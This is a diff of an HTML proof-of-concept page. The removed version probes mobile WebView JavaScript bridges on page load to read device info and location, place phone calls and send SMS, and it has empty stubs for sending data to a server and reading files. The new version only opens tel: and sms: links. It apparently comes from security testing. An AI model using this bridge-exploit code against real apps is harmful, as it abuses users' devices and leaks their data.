@@ -1,330 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>PoC</title>
-    <meta charset="utf-8">
+  <meta charset="utf-8">
+  <title>PoC</title>
 </head>
 <body>
-    <div id="result">Starting complete test...</div>
-    <script>
-        function log(message) {
-            document.getElementById('result').innerHTML += '<br>' + message;
-            console.log(message);
-        }
-
-        function attemptPhoneCall() {
-            var phoneNumbers = [
-                'tel:1234567890'
-            ];
-
-            phoneNumbers.forEach(function(phone) {
-                try {
-                    log('Attempting phone call: ' + phone);
-                    window.location.href = phone;
-                    var link = document.createElement('a');
-                    link.href = phone;
-                    link.click();
-                    if (typeof _bridge !== 'undefined') {
-                        try {
-                            _bridge.prompt('dial', phone);
-                        } catch(e) {
-                            log('Bridge dial error: ' + e.message);
-                        }
-                    }
-                } catch(e) {
-                    log('Phone call error: ' + phone + ' - ' + e.message);
-                }
-            });
-        }
-
-        function attemptSMS() {
-            var smsNumbers = [
-                'sms:1234567890'
-            ];
-
-            smsNumbers.forEach(function(sms) {
-                try {
-                    log('Attempting SMS: ' + sms);
-                    window.location.href = sms;
-                } catch(e) {
-                    log('SMS error: ' + sms + ' - ' + e.message);
-                }
-            });
-        }
-
-        function attemptEmail() {
-
-        }
-
-        function attemptAppLaunch() {
-
-        }
-
-        function readAndSendFiles() {
-          
-
-        }
-
-
-
-
-        function exploitJSBridge() {
-
-            if (typeof SYNC_HANDLER !== 'undefined') {
-
-                try {
-
-                    log('✓ SYNC_HANDLER available');
-
-
-
-
-                    var result = SYNC_HANDLER.__js__call__native__('getDeviceInfo', '{}');
-
-                    log('Device info: ' + result);
-
-
-
-                    sendDataToServer('device_info', {
-
-                        bridge: 'SYNC_HANDLER',
-
-                        method: '__js__call__native__',
-
-                        result: result
-
-                    });
-
-                } catch(e) {
-
-                    log('✗ SYNC_HANDLER error: ' + e.message);
-
-                }
-
-            }
-
-
-
-            if (typeof _bridge !== 'undefined') {
-
-                try {
-
-                    log('✓ _bridge available');
-
-
-
-
-                    var result = _bridge.prompt('test', 'data');
-
-                    log('Bridge prompt result: ' + result);
-
-
-
-                    sendDataToServer('bridge_info', {
-
-                        bridge: '_bridge',
-
-                        method: 'prompt',
-
-                        result: result
-
-                    });
-
-                } catch(e) {
-
-                    log('✗ _bridge error: ' + e.message);
-
-                }
-
-            }
-
-
-
-            if (typeof _dlGeolocation !== 'undefined') {
-
-                try {
-
-                    log('✓ _dlGeolocation available');
-
-                    var result = _dlGeolocation.exec('getCurrentPosition', '{}');
-
-                    log('Location result: ' + result);
-
-
-                } catch(e) {
-
-                    log('✗ _dlGeolocation error: ' + e.message);
-
-                }
-
-            }
-
-        }
-
-
-
-        function sendDataToServer(type, data) {
-
-           
-
-        }
-
-
-
-
-        function triggerPhoneCall() {
-
-            var phoneNumber = '1234567890';
-
-
-
-
-
-            try {
-
-                window.location.href = 'tel:' + phoneNumber;
-
-                log('✓ Phone call triggered (location.href)');
-
-            } catch(e) {
-
-                log('✗ Phone call failed (location.href): ' + e.message);
-
-            }
-
-
-
-            try {
-
-                var link = document.createElement('a');
-
-                link.href = 'tel:' + phoneNumber;
-
-                link.textContent = 'Call';
-
-                document.body.appendChild(link);
-
-                link.click();
-
-                log('✓ Phone call triggered (link click)');
-
-            } catch(e) {
-
-                log('✗ Phone call failed (link click): ' + e.message);
-
-            }
-
-
-
-
-            if (typeof _bridge !== 'undefined') {
-
-                try {
-
-                    _bridge.prompt('dial', 'tel:' + phoneNumber);
-
-                    log('✓ Phone call triggered (JS Bridge)');
-
-                } catch(e) {
-
-                    log('✗ Phone call failed (JS Bridge): ' + e.message);
-
-                }
-
-            }
-
-
-
-
-            if (typeof SYNC_HANDLER !== 'undefined') {
-
-                try {
-
-                    SYNC_HANDLER.__js__call__native__('dial', '{"number":"' + phoneNumber + '"}');
-
-                    log('✓ Phone call triggered (SYNC_HANDLER)');
-
-                } catch(e) {
-
-                    log('✗ Phone call failed (SYNC_HANDLER): ' + e.message);
-
-                }
-
-            }
-
-        }
-
-
-
-
-        function executeCompleteExploit() {
-
-            log('=== Starting Complete Exploit ===');
-
-            log('Timestamp: ' + new Date().toISOString());
-
-
-
-
-            log('--- Attempting Phone Calls ---');
-
-            attemptPhoneCall();
-
-
-
-
-            log('--- Attempting SMS ---');
-
-            attemptSMS();
-
-
-
-
-            log('--- Attempting Email ---');
-
-            attemptEmail();
-
-
-
-
-            log('--- Attempting App Launch ---');
-
-            attemptAppLaunch();
-
-
-
-
-            log('--- Reading Files ---');
-
-            readAndSendFiles();
-
-
-
-
-            log('--- Exploiting JS Bridge ---');
-
-            exploitJSBridge();
-
-
-
-
-
-
-            log('=== Finished ===');
-
-        }
-
-
-
-
-        window.onload = function() {
-
-            executeCompleteExploit();
-
-        };
-
-    </script>
-
+  <div id="result">Starting test...</div>
+
+  <script>
+    function log(message) {
+      const result = document.getElementById("result");
+      result.innerHTML += "<br>" + message;
+      console.log(message);
+    }
+
+    function attemptPhoneCall() {
+      const phone = "tel:1234567890";
+
+      try {
+        log("Attempting phone call: " + phone);
+        window.location.href = phone;
+      } catch (e) {
+        log("Phone call error: " + e.message);
+      }
+    }
+
+    function attemptSMS() {
+      const sms = "sms:1234567890";
+
+      try {
+        log("Attempting SMS: " + sms);
+        window.location.href = sms;
+      } catch (e) {
+        log("SMS error: " + e.message);
+      }
+    }
+
+    function runTest() {
+      log("=== Starting Test ===");
+      log("Timestamp: " + new Date().toISOString());
+
+      log("--- Attempting Phone Call ---");
+      attemptPhoneCall();
+
+      log("--- Attempting SMS ---");
+      attemptSMS();
+
+      log("=== Finished ===");
+    }
+
+    window.onload = runTest;
+  </script>
 </body>
-
 </html>
